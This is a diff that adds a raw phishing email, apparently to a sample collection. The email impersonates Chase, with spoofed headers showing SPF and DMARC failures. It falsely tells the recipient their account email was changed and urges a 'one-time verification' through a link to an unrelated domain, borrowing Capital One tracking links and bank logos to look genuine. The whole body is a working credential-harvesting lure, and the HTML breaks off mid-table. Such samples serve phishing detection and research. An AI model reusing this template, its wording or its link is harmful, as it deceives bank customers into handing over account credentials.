@@ -1,0 +1,516 @@
+Return-Path: <alerts@Online.net>
+Received: from Online.net ([222.96.157.252])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id mbrnt7rh1b1cg5b1v89as368ce125cv8v231k901
+ for zingerpie@kfcreview.com;
+ Mon, 02 Feb 2026 13:34:39 +0000 (UTC)
+Received-SPF: fail (spfCheck: domain of Online.net does not designate 222.96.157.252 as permitted sender) client-ip=222.96.157.252; envelope-from=alerts@Online.net; helo=Online.net;
+Authentication-Results: amazonses.com;
+ spf=fail (spfCheck: domain of Online.net does not designate 222.96.157.252 as permitted sender) client-ip=222.96.157.252; envelope-from=alerts@Online.net; helo=Online.net;
+ dmarc=fail header.from=online.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFGSFo0K3pFS2RXWFR5QysydzRkQXptWGV6UDJoRlB0UWdOeEpTVjM1R1NQVFZ3Vktnc3NXTXNVbmJVUnVTVDIwQisvVGxOcXhLd2FRL2VaVkpyd044cmhnTGhMalViRExYV0RwWXRMY3REd2x5VEwvKzlTYUo0TVhQaGh1OEQ0UkZGZnd0dmhQaFlBRnJvbHNUa2tMUHppOUlyeDdBV25TNHJrNVFRLzVIR0QvNHhOS3FSZ3l3Qm4yTG0zcExsSEJid1ZyS1BiSC92c2hmc3RCRXZBMzhvMXFuSXFoR2ZqdkQ1QUhTa3loWTNoZExvOTkzZG16ZmtER0IxNWRma0RqZFhSUGlUY3JrN3pHNGEvYkJ4d3JRM2JoQ2I5Y2RXdm56d2M0b0VJQ2VhN1FBcG93NEJNM203bUtkdDkybjA0Tzg9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=t86U1ZMbfjv5XDQUsFfAj+Z8jC+ux3w5Fgi3Hufw8RLwouRFOKPmYjsHRRx9rOUk4HYFA9N96ZE1jB3O14BWkfmlOdrIb68m0jgbEqZwnLxLbx84DvZqI2KQnyB1RlTffqZQcKE0PmqoXKwGicnwWDRqD0/5Pn7sbQAEoR+H4Lw=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1770039280; v=1; bh=656TMfHLyIvPLOUEXvO5gDXDmcWln8RM/oHt2qReLDE=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Chase" <alerts@Online.net>
+To: zingerpie@kfcreview.com
+Subject:  Profile Update: Email Address Change 
+Date: 02 Feb 2026 22:34:38 +0900
+Message-ID: <20260202223437.86EAAD6BB8C2A8EC@Online.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META content=3D"text/html; charset=3DUTF-8" http-equiv=3DContent-Type>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE class=3Ddarkmode style=3D"FONT-SIZE: 12px; MAX-WIDTH: 640px; FONT-FA=
+MILY: Verdana; WIDTH: 640px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; OR=
+PHANS: 2; WIDOWS: 2; MARGIN: 0px auto; LETTER-SPACING: normal; BACKGROUND-C=
+OLOR: rgb(244,244,244); font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 align=3Dcen=
+ter bgColor=3D#f4f4f4 border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dtop style=3D"PADDING-TOP: 15px">
+<TABLE class=3Ddarkmode style=3D"WIDTH: 640px" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" bgColor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 25px; P=
+ADDING-RIGHT: 25px">
+&nbsp;<IMG style=3D"HEIGHT: 153px; WIDTH: 299px" alt=3D"Chase Bank Review"=
+=20
+src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAT4AAACfCAMAAABX0UX9AA=
+AAt1BMVEX///8fHx8SeswAAAAcHBwTExPh4eEjJSVra2sKCgoAcsW5uroAd8RkZGTQ0ND6+vnq6=
++oAcManp6fD2OmFhYUEeMyyy+JKjsra2trT4+6ysrIYGBgJCQnC1+acoKApKSlZlcuArNPHyMh3=
+eHhUVFRGRkaMjY0Ab8k/Pz/f6/Hw8fCWlpY3Nzd1dXWcwNyOttglfMFwos04hsVcXFwAYrutx99=
+Xl9Klu8sAZ7Z5ps0UesTa5+9nns0lle3iAAAHWElEQVR4nO2cCVvaShSGQxZKEGQRXNhUQFBEa0=
+t7b2/b//+7LoHMlsyZmYAVsd/bPk9LnSQnb2Y9TOp5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+AAAAAAAAAAAAAAAAACOiOHZMMvVoWM6Hi7mrRzz50NHdRQ8DL1hy
+=20
+9cw/3zo0I6ARe3MO9Pq8+e3hw7u3bN4mQ8pfX7ry6HDe+c0vnZbZO1b+7s5dIDvmrU936TP5K9R=
+vjw1cLkpxD+SZ7GWkE7SsN5Q0xjT6Wkzf1IzZdPVLqo1sz6/eqE9cDxZBma2OvhH6s6bvAQZZJk=
+XaZvdnU76lqBCUdhSktGkL+fdVJMKZtTnty7yd94LgygsmYg725KD9LNB37ZA+ImM8ilKTxL2Tf=
+IWK1tQpeBSFP9kKbs9wPTAfm+sWfT53a+ZW19MA9ulw1J6TLy/PlYiOUuPvpnLIMrHoTKYSOVd9=
+PXvDfa+bKXZ9Pndl4Vir2+NsxSMvVfT14n5acNr8maa1kdaCkP5ABd9gaHn+9zya076/O7PB+m4=
+6771slGFFd5f3yKQThycUHdzV+CZuuoLZgZ7c9a5WfX53ZrwNwmsly0FvLrur282kE5MtqYTe1R=
+RXTnCrs9Q173n+bbuOemT/JWlOMN+pEXqovbW11AbpVqDBHe8S
+=20
+UTkIKp0QUJfTB5Az6We51yNi761vzQBM+E9UT+Ip/WKDqmH3lvfSK1W/TtCMnuig6dRW09GPNMX=
+PxLl2/Q4dS7suenzu9WtPz43iO4NE13O3vpYl8ZPpL3qmOmTpyZmmD7jzE6Pomut7/xbPl+Vy19=
+9O/OS6QGrBqYxXbCvvnb647iTdoHRylSsP3WKKmF3fVdVX9X38P3cge9rBb2Cj3lffelNhgNvld=
+ZD7WRixOROND/Us7O+qx9+Rp87j7G5rWXZUx97WoOZd5r+VUyKJGYxq6RuYXm763uodl31XamsF=
+UzSOpCZBZDsqW8p3eOyT1e/N9SXTS0b9H1Lcvgij7+evVT6xeLcT99YrnGsJuoa6Bvqyw6zBn3V=
+TMnPXiV6S333rMJthtsBfcOPb9f37a6ve/u2tY91d+kozxxprv2GI+9h9FEFFgZ9fLA9SYuyO15=
+kS4p5n8tkdMNh9O3aeHsE7QGpj80xeZqPJf6Cx2xRkVcIJqM87
+=20
+d5pzjjXN74keGV9tT30lciFZYnUV8na4nP2fFew5Ctjas27HKkH8TUvFdjglfXtU/us5PXx5IRo=
+qywxkE8Cj6wZlzAYKItYW8aFyrcciz7WVKXRlHdxuax9w6ovESjn7z64vqZueVhiHVYuG+KQ8FN=
+r7QfXx3L0ylyEtVHNvc2c/Ilh9mPr42Opkp/nyVNN1v7R/l2RHPZx6Ss68vLchHoXrE6Gy/y1yp=
+UgiLXpb/HtjBizrSNv9I70BScEbf20mQ8FmUG2rK2UjObJ7EmX/r4X00Kec+bzvjYV2nvSRxUgV=
+h0jaopXTwMI9Vl7Aj6wDEbsn45r1VFwzRumNxdVyspKoNwuvjxLmOZmQVyfcRdLnmPQxyXlFxHs=
+BwWyA57IaPV5svUj63PaAuD8rZAnsvlC+kH1RX9Un9Mc2DXhveEP6huSRfP6eLL+ye1iu+lbOlS=
++Yjf+evoeWtWuTKHa12EDn2bepWMnfWOXyuf+CBNeT583vJH55
+=20
+4J+gSObrL/lYbiO9zvpu7NvQioSQwKbhYsWv7M+d1R93ZeGqBja7wvz7KLvlK9EiPUAs1vgi6Gn=
+XKfz1voSe0paN5fA1bCLPpajDyN9gvpkyvzls/YEPOwBT1Tvvsvg3x81B/5T9XV/bmIVDSsOVrN=
+kO85o80v80R5Jm3F20MdzymTl4tUzVjbglUl613yBm1+0jamjSK/f5776VbmG6q2ij21Rk+cUkX=
+Zv10DeCraDPrYsM9SLZV9z2jGZlQjEJjcRmjVlENDN+txhS5Wqr/orGzqNtI2nuL6yQ+/Kn6H8p=
+VHJYbYjndM+M4/oZfVZlRan0dfl9kTbMiDSIcX18X30pkUt2yYXxvyf3NKlokK5bM6ld/gNW5bm=
+q+hrSZObtj3OMGS2CuvjOXpiI+SWx1w+y+WpKpXVQV9oGJquLP5kfXNlYdILrO03ZomNwvo6IkN=
+o0Me/MeeV1qFPKQXyPNtlWW2anf2qdmtu+rLrkvK9VSBreUX18
+ RmGZQdc1vKjtfKFcTCSz+D2WgyxlTrhoWaqf0Lf/Dx36HiaZLMNxOnds0IGfWmJ7UsXM36A+QW=
+sMisXXytnocJZR9tRB/JQn9fPHDcwvEb38NPgj+trad8qX4xHnUqdZrXtdtnHKRXGYlWvV5LfFa=
+V8fWV5/a/Dz5zU85l+jzqn086NQ+YDGHXDe0zewuCP6dPbAwmLF9Jfqg9v5JtIXug16cP75GYaF=
+8QCZKMP9mxQ/hJ989+Hju4IuNH6q96uzR46tKPg97ybZ/7sNez/dwBYc/v1IgdGXAAAAAAAAAAA=
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD4a/gfC3m8OBqqAuwAAAAASUVORK5CYII=3D"=
+ width=3D317 height=3D159>
+ <A href=3D"https://deref-mail.com/mail/client/vBQQrXTzs8o/dereferrer/?redi=
+rectUrl=3Dhttps%3A%2F%2Fclick-notification.capitalone.com%2Ff%2Fa%2FzfWs1wZ=
+-V2jYVSUxfgrmPA%7E%7E%2FAAAAAQA%7E%2FRgRhrMT8P0QbaHR0cHM6Ly93d3cuY2FwaXRhbG=
+9uZS5jb20vVwZjYXBvbmVCCgAy_D_KX8dlTyhSEWpoYXJ0b25nQG1haWwuY29tWAQAAAAA" tar=
+get=3D_blank></A></TD>
+<TD style=3D"PADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 25px; P=
+ADDING-RIGHT: 25px" align=3Dright>
+<A class=3D468f2a295d7a253dyiv5015386191webfont style=3D"FONT-SIZE: 14px; T=
+EXT-DECORATION: none; FONT-FAMILY: arial, helvetica, sans-serif; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR=
+: rgb(37,95,130); OUTLINE-WIDTH: 0px; FONT-STYLE: normal; OUTLINE-STYLE: no=
+ne; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; OUTLINE-COLOR: invert; L=
+INE-HEIGHT: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px"=20
+href=3D"http://t.co/AYXBdgetQY" rel=3D"noopener noreferrer" target=3D_blank=
+ data-link-id=3D"44"><SPAN class=3D56871b468c36605byiv5015386191textLink st=
+yle=3D"WHITE-SPACE: nowrap; BORDER-BOTTOM: rgb(37,95,130) 1px solid; PADDIN=
+G-BOTTOM: 1px">Sign&nbsp;In</SPAN></A><BR><BR>Date 2026-2-2 p.m. 10:34:37</=
+TD></TR></TBODY></TABLE>
+<TABLE class=3Ddarkmode style=3D"WIDTH: 640px" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" bgColor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 0px; FONT-FAMILY: arial, helvetica,=
+ sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 0px; TEXT-ALIGN: right; =
+PADDING-TOP: 0px; PADDING-LEFT: 25px; LINE-HEIGHT: 0px; PADDING-RIGHT: 25px=
+" vAlign=3Dtop align=3Dright>
+<TABLE align=3Dright>
+<TBODY>
+<TR>
+<TD vAlign=3Dmiddle><IMG class=3Dwebfont style=3D"COLOR: rgb(20,20,20); FON=
+T: 13px/13px Arial, sans-serif; DISPLAY: block" border=3D0 alt=3D"" src=3D"=
+https://ecm.capitalone.com/Messaging/assets/images/alerts/10000/11036_SLRAC=
+R/11187/Eno_Card-Last-4-Icon_DM_Retina.png" width=3D28 align=3Dright height=
+=3D18></TD>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 13px; FONT-FAMILY: arial, helvetica=
+, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 0px; TEXT-ALIGN: center=
+; PADDING-TOP: 0px; PADDING-LEFT: 4px; LINE-HEIGHT: 13px; PADDING-RIGHT: 0p=
+x" vAlign=3Dmiddle>&#8230;****</TD></TR></TBODY></TABLE></TD></TR></TBODY><=
+/TABLE>
+<TABLE class=3Ddarkmode cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgCo=
+lor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 0px; PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDI=
+NG-TOP: 20px; PADDING-LEFT: 25px; PADDING-RIGHT: 25px" align=3Dcenter>
+<DIV style=3D"HEIGHT: 126px; WIDTH: 564px; VERTICAL-ALIGN: top; DISPLAY: in=
+line-block">
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD align=3Dcenter>
+<TABLE class=3Ddarkmode style=3D"HEIGHT: 99px; WIDTH: 568px" cellSpacing=3D=
+0 cellPadding=3D0 width=3D568 bgColor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD class=3D"webfont " style=3D"FONT-FAMILY: arial, helvetica, sans-serif; =
+WIDTH: auto; COLOR: rgb(37,95,130)" vAlign=3Dmiddle>
+<H1 class=3Denobanner style=3D"FONT-SIZE: 36px; PADDING-BOTTOM: 0px; TEXT-A=
+LIGN: left; PADDING-TOP: 25px; PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT:=
+ 40px; PADDING-RIGHT: 0px">
+<P style=3D"MARGIN: 0px">Your Information Has Been Updated.</P></H1></TD>
+<TD vAlign=3Dtop width=3D79 align=3Dleft>
+<IMG style=3D"HEIGHT: 59px; WIDTH: 107px" alt=3D"Chase Mobile&reg;: Bank &a=
+mp; Invest on the App ..."=20
+src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAT4AAACfCAMAAABX0UX9AA=
+AAbFBMVEX4+PgPW6f///8ATaL///wAVqXe5OzM2OdJerUAWKZtjb4AS6Ht8vgAUqQAT6Ojt9Z8m=
+sfl6/HAzuFvk8K3x92Vrc8ASKB2l8RYg7qvwdkdYqvx9PY1b7FGeLSmu9bS3emLpswya66bs9Ji=
+ib2IatI6AAAFGElEQVR4nO3da3OiMBiGYclBjJJUVFQEtYf//x8XxtmulhCSBnE2ee7vywzXglS=
+EN7MZQgghhBBCCCGEEEIIIYQQQui/ijVV+dyrvGq38uo9mTzCsk2xrBOpFPVIKZnUy2KTMfLqPZ=
+owll3OUkkukhESvNnU+ZLFcgyyfCvlKHJ3hlJu8xgAWbXe83HtbvH9ugoekG2EfAZemxSbwP1Ys=
+Rr5tL1PrIqg/diWPg+vjW4D9mPLp524f1Ph+rGDerZe43cI1I9dn
+=20
+nzm3qKXMP3mExx7bWr+6j19Rqx+4jX3PlEHePiRcqKDrzn8ygC/AZ8mOviaw+/06n0dPbab7OBr=
+Dr9daKcvW0x28DWH3yI0vqkuu7dCu/iSN4fvG4L3ZbsF+RbWxYMd7c9dtVj3ZXsIi2NgZ6/lfjf=
+HF92Q3lJl+7/w6v0dt9zquBGilPzQr9f4Wd6mVvmr93jUUis+Nb+q5mPL1NzOT6Wv3uMxY6XNlU=
+NdSUoH+Eie2FxAZBnShx8rLPhWKbHgI5nN1xcZ1G1nth4+ZPbtJcOCj1Sn4Y3xdVB8h8E93pfEk=
+o/MPga3xoO6acqWQzu8uqlZ8RFWD30W8GVUfKuCOPARthjwi4uPvhMnPkKOZr+o+Oj6r4o1H/ky=
+/iUZE5/afqPY85GD6YeniPjk1z8TBz7ybvCLh08e70hc+Mj7Cnz8fC/ixEc+97Hz8Zr9no9c+vw=
+i4eMfswcPRz6y6zl/4+ATp+qRw5WPbPTXjyj4RPJDz52v5wZ0D
+=20
+HyC5x0MZz5ypRq/CPiE7Oi1fBdHPpKfouSj8y5FSsXHwrGj5tmj8PlUqjmSUpoI52L87FPa3yPT=
+oScouepENTcPgudbZb/hU1fNP9L8DgU+bVR3xpPPjh/4HPjyzr8CnwNf1vnqBj7wfQc+r8DnFfi=
+8Ap9X4PMKfF6BzyvweQU+r8DnFfi8Ap9X4PMKfF6BzyvweQU+r8DnFfi80vDR7gMu4OtJwyc/wW=
+eb7hkXWWogrgPv/er5qgj5EkW7z6sMvfqm59t00CPgE9z9WSotn+ZV9fD5RH10fZLvQ+j4rprPy=
+/D5kpP2TxdTF6nh0043iIBPUN3TZqbeNHy5dnh2BHyJ0D5g6saXJdrJBjHwmUfeWPFVPXMh4uBL=
+Vjsvvt6pBpHwJXuX9xA6fHXvq3KR8CX7z9/znfvf04yF73sKhDufYZ5BPHz/5kA48n0ZpkFExJd=
+Q49C0Pr6taZZGTHyJ+jKY9fCtjbe2ouJ7nGdgxWeaAxEdXyIXb
+=20
+nxF/xSIGPkSeTbLPfK9DeiFxjc8Qe3nVAMTX9k7QeN7a2FNULOY38d/zjXo5dsN6oU2v89meqQY=
+vAF440uHztwkuOmRVrNLudD+ePmDT3dzucsX1OxSy8m5Qmrez3/gU9e51ZIzYU3OtZzb3PgZb6A=
+euCztVmYMbG6z7dRw4w3oduSN7dj6V+/vuNnPrJe9A+sX9osuhDaz3mHFhN7lEhwW/JCXsFZMmH=
+q9jsA++rBajF9Yq8gzrJTlEysnWWKxjYb1leMWO0+1SuA5QD2sUekZVkj1i1mvdOWRCupO30Ns+=
+3S/gFeHxtrkvrFCN6h1rAQN6iazJpaKpy3vLpM0cL3Gb7beW6816RLfr2fB6zWx/CAtF/uzTkh5=
+yGPAa2PZZSGVdLmDZ5DjzaYWlywWvDbGsk2xrNtBuNSj9jWkellsMhYT3i3WVOVzr/Kq3cqr9wQ=
+hhBBCCCGEEEIIIYQQQggh5NYfpBR9xuVxZO0AAAAASUVORK5CY
+ II=3D" width=3D317 height=3D159><A href=3D"https://deref-mail.com/mail/cli=
+ent/KsTh6KYCiVo/dereferrer/?redirectUrl=3Dhttps%3A%2F%2Fclick-notification.=
+capitalone.com%2Ff%2Fa%2FPKp3pfEgLjDalQH9_7NDLA%7E%7E%2FAAAAAQA%7E%2FRgRhrM=
+T8P0QsaHR0cHM6Ly93d3cuY2FwaXRhbG9uZS5jb20vYXBwbGljYXRpb25zL2Vuby9XBmNhcG9uZ=
+UIKADL8P8pfx2VPKFIRamhhcnRvbmdAbWFpbC5jb21YBAAAAAA%7E" target=3D_blank></A>=
+</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY=
+></TABLE>
+<TABLE class=3Ddarkmode cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgCo=
+lor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 0px; HEIGHT: 1px; WIDTH: 590px; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT: 1px; PADDING-RIGHT: 2=
+5px; MAX-HEIGHT: 1px" align=3Dcenter>
+<DIV style=3D"FONT-SIZE: 0px; HEIGHT: 1px; WIDTH: 590px; BORDER-BOTTOM: rgb=
+(212,212,212) 1px solid"></DIV></TD></TR></TBODY></TABLE>
+<TABLE class=3Ddarkmode style=3D"HEIGHT: 286px; WIDTH: 640px" cellSpacing=
+=3D0 cellPadding=3D0 width=3D640 bgColor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial, helvetica=
+, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 20px; TEXT-ALIGN: left;=
+ PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT: 22px; PADDING-RIGHT: 2=
+5px">
+<P style=3D"MARGIN: 0px">
+<TABLE role=3Dpresentation style=3D"HEIGHT: 159px; WIDTH: 586px" cellSpacin=
+g=3D0 cellPadding=3D0 width=3D586 border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 0px; PADDING-BOTTOM: 10px; PADDING-TOP: 0px; PADDIN=
+G-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<DIV style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Helvetica Neue", Roboto, Helve=
+tica, sans-serif, serif, EmojiFont; FONT-WEIGHT: 400; COLOR: rgb(51,51,51) =
+!important; TEXT-ALIGN: left; LINE-HEIGHT: 22px'>
+<P style=3D"MARGIN: 0px">Dear Chase Member,</P></DIV></TD></TR>
+<TR>
+<TD style=3D"FONT-SIZE: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
+-LEFT: 0px; PADDING-RIGHT: 0px" align=3Dleft>
+<DIV style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Helvetica Neue", Roboto, Helve=
+tica, sans-serif, serif, EmojiFont; FONT-WEIGHT: 400; COLOR: rgb(51,51,51) =
+!important; TEXT-ALIGN: left; LINE-HEIGHT: 22px'>
+<P style=3D"MARGIN: 0px">As requested, we've changed your email address fro=
+m <STRONG>zingerpie@kfcreview.com</STRONG> to <STRONG><A href=3D"mailto:rg*=
+*****1@outlook.com">rg******1@outlook.com</A></STRONG>.</P>
+<P style=3D"MARGIN: 0px">&nbsp;</P>
+<P style=3D"MARGIN: 0px">Your security is important to us. <STRONG>If this =
+change was unauthorized or incorrect, please use the link below to recover =
+your account </STRONG><STRONG>immediately. (A one-time verification of your=
+ account maybe required)</STRONG></P></DIV></TD></TR></TBODY></TABLE></P>
+<P style=3D"MARGIN: 0px">&nbsp;</P>
+<P style=3D"MARGIN: 0px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp; <A href=3D"https://bowman.bodley.org/wx.htm">Complete A One-time=
+ Verification Process&nbsp; </A></P>
+<P style=3D"MARGIN: 0px">&nbsp;</P>
+<P style=3D"MARGIN: 0px">Thank you for your&nbsp; Membership</P></TD></TR><=
+/TBODY></TABLE>
+<TABLE class=3Ddarkmode cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgCo=
+lor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial, helvetica=
+, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 20px; TEXT-ALIGN: left;=
+ PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT: 22px; PADDING-RIGHT: 2=
+5px">
+<P style=3D"MARGIN: 0px">
+<IMG style=3D"HEIGHT: 70px; WIDTH: 148px" alt=3D"Chase Mobile&reg;: Bank &a=
+mp; Invest on the App ..."=20
+src=3D"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAT4AAACfCAMAAABX0UX9AA=
+AAbFBMVEX4+PgPW6f///8ATaL///wAVqXe5OzM2OdJerUAWKZtjb4AS6Ht8vgAUqQAT6Ojt9Z8m=
+sfl6/HAzuFvk8K3x92Vrc8ASKB2l8RYg7qvwdkdYqvx9PY1b7FGeLSmu9bS3emLpswya66bs9Ji=
+ib2IatI6AAAFGElEQVR4nO3da3OiMBiGYclBjJJUVFQEtYf//x8XxtmulhCSBnE2ee7vywzXglS=
+EN7MZQgghhBBCCCGEEEIIIYQQQui/ijVV+dyrvGq38uo9mTzCsk2xrBOpFPVIKZnUy2KTMfLqPZ=
+owll3OUkkukhESvNnU+ZLFcgyyfCvlKHJ3hlJu8xgAWbXe83HtbvH9ugoekG2EfAZemxSbwP1Ys=
+Rr5tL1PrIqg/diWPg+vjW4D9mPLp524f1Ph+rGDerZe43cI1I9dn
+=20
+nzm3qKXMP3mExx7bWr+6j19Rqx+4jX3PlEHePiRcqKDrzn8ygC/AZ8mOviaw+/06n0dPbab7OBr=
+Dr9daKcvW0x28DWH3yI0vqkuu7dCu/iSN4fvG4L3ZbsF+RbWxYMd7c9dtVj3ZXsIi2NgZ6/lfjf=
+HF92Q3lJl+7/w6v0dt9zquBGilPzQr9f4Wd6mVvmr93jUUis+Nb+q5mPL1NzOT6Wv3uMxY6XNlU=
+NdSUoH+Eie2FxAZBnShx8rLPhWKbHgI5nN1xcZ1G1nth4+ZPbtJcOCj1Sn4Y3xdVB8h8E93pfEk=
+o/MPga3xoO6acqWQzu8uqlZ8RFWD30W8GVUfKuCOPARthjwi4uPvhMnPkKOZr+o+Oj6r4o1H/ky=
+/iUZE5/afqPY85GD6YeniPjk1z8TBz7ybvCLh08e70hc+Mj7Cnz8fC/ixEc+97Hz8Zr9no9c+vw=
+i4eMfswcPRz6y6zl/4+ATp+qRw5WPbPTXjyj4RPJDz52v5wZ0D
+=20
+HyC5x0MZz5ypRq/CPiE7Oi1fBdHPpKfouSj8y5FSsXHwrGj5tmj8PlUqjmSUpoI52L87FPa3yPT=
+oScouepENTcPgudbZb/hU1fNP9L8DgU+bVR3xpPPjh/4HPjyzr8CnwNf1vnqBj7wfQc+r8DnFfi=
+8Ap9X4PMKfF6BzyvweQU+r8DnFfi8Ap9X4PMKfF6BzyvweQU+r8DnFfi80vDR7gMu4OtJwyc/wW=
+eb7hkXWWogrgPv/er5qgj5EkW7z6sMvfqm59t00CPgE9z9WSotn+ZV9fD5RH10fZLvQ+j4rprPy=
+/D5kpP2TxdTF6nh0043iIBPUN3TZqbeNHy5dnh2BHyJ0D5g6saXJdrJBjHwmUfeWPFVPXMh4uBL=
+Vjsvvt6pBpHwJXuX9xA6fHXvq3KR8CX7z9/znfvf04yF73sKhDufYZ5BPHz/5kA48n0ZpkFExJd=
+Q49C0Pr6taZZGTHyJ+jKY9fCtjbe2ouJ7nGdgxWeaAxEdXyIXb
+=20
+nxF/xSIGPkSeTbLPfK9DeiFxjc8Qe3nVAMTX9k7QeN7a2FNULOY38d/zjXo5dsN6oU2v89meqQY=
+vAF440uHztwkuOmRVrNLudD+ePmDT3dzucsX1OxSy8m5Qmrez3/gU9e51ZIzYU3OtZzb3PgZb6A=
+euCztVmYMbG6z7dRw4w3oduSN7dj6V+/vuNnPrJe9A+sX9osuhDaz3mHFhN7lEhwW/JCXsFZMmH=
+q9jsA++rBajF9Yq8gzrJTlEysnWWKxjYb1leMWO0+1SuA5QD2sUekZVkj1i1mvdOWRCupO30Ns+=
+3S/gFeHxtrkvrFCN6h1rAQN6iazJpaKpy3vLpM0cL3Gb7beW6816RLfr2fB6zWx/CAtF/uzTkh5=
+yGPAa2PZZSGVdLmDZ5DjzaYWlywWvDbGsk2xrNtBuNSj9jWkellsMhYT3i3WVOVzr/Kq3cqr9wQ=
+hhBBCCCGEEEIIIYQQQggh5NYfpBR9xuVxZO0AAAAASUVORK5CY
+ II=3D" width=3D316 height=3D159></P></TD></TR></TBODY></TABLE>
+<TABLE class=3Ddarkmode style=3D"WIDTH: 640px" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" bgColor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 1px; PADDING-LEFT: 25px; PA=
+DDING-RIGHT: 5px" width=3D"10%"></TD>
+<TD class=3Dwebfont style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial, helvetica=
+, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 20px; TEXT-ALIGN: left;=
+ PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 22px; PADDING-RIGHT: 25p=
+x" width=3D"90%">Chase Security Team </TD></TR></TBODY></TABLE>
+<TABLE class=3Ddarkmode cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgCo=
+lor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 0px; HEIGHT: 1px; WIDTH: 590px; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 25px; LINE-HEIGHT: 1px; PADDING-RIGHT: 25=
+px; MAX-HEIGHT: 1px" align=3Dcenter>
+<DIV style=3D"FONT-SIZE: 0px; HEIGHT: 1px; WIDTH: 590px; BORDER-BOTTOM: rgb=
+(212,212,212) 1px solid"></DIV></TD></TR></TBODY></TABLE>
+<TABLE class=3Ddarkmode cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgCo=
+lor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD class=3D"webfont surveyheadline" style=3D"FONT-SIZE: 18px; FONT-FAMILY:=
+ arial, helvetica, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 20px; =
+TEXT-ALIGN: center; PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT: 24p=
+x; PADDING-RIGHT: 25px">
